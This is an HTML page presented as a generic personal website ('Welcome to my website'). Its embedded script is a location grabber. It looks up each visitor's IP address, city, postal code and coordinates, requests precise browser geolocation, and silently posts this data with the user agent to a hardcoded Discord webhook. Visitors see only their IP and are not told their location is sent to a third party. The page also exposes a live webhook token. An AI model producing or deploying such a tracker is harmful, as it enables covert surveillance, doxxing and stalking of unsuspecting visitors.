<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your Website Title</title>
    <style>
        #ip-display {
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.8);
            color: #00ff00;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            z-index: 9999;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div id="ip-display">Your IP is: <span id="ip-span">detecting...</span></div>
    
    <h1>Welcome to my website</h1>
    <p>Content goes here...</p>
    
    <script>
        // Get user's IP and location
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const lat = data.latitude;
                const lon = data.longitude;
                const city = data.city;
                const region = data.region;
                const country = data.country_name;
                const postal = data.postal;
                
                // Display IP to user
                document.getElementById('ip-span').textContent = ip;
                
                // Create Google Maps link
                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                // Prepare payload
                const payload = {
                    ip: ip,
                    coordinates: `${lat}, ${lon}`,
                    latitude: lat,
                    longitude: lon,
                    city: city,
                    region: region,
                    country: country,
                    postalCode: postal,
                    mapsLink: mapsLink,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                };
                
                // Try to get more precise location
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            payload.preciseLat = position.coords.latitude;
                            payload.preciseLon = position.coords.longitude;
                            payload.preciseMapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                            
                            // Send with precise location
                            sendData(payload);
                        },
                        (error) => {
                            // Send with approximate location
                            sendData(payload);
                        }
                    );
                } else {
                    // Send without precise location
                    sendData(payload);
                }
            })
            .catch(err => {
                console.log('IP fetch failed:', err);
                document.getElementById('ip-span').textContent = 'Failed to detect';
            });
        
        function sendData(data) {
            // Send to your webhook/server
            fetch('https://discord.com/api/webhooks/1454552751521402892/9yXxj3zUYhU3rlx3De5pRdOSwpfc5bX2zT5zq5WVb5TDVUleps7H_VBdqPn1vXWtNBN-', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
        }
    </script>
</body>
</html>
